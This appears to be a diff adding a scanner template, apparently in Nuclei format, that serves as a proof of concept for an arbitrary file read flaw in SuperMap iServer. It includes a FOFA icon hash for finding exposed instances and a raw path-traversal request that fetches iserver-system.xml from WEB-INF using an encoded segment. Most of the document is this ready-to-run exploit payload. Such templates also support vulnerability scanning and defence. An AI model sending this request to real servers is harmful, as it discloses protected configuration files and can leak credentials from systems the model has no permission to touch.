@@ -1,0 +1,19 @@
+id: poc-zpxehuon15ls1skk
+info:
+  name: 北京超图软件iserver存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zpxehuon15ls1skk'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zpxehuon15ls1skk
+    fofa: icon_hash="-1656662001"
+http:
+- raw:
+  - GET /iserver/output/../WEB-IN%2546/iserver-system.xml HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
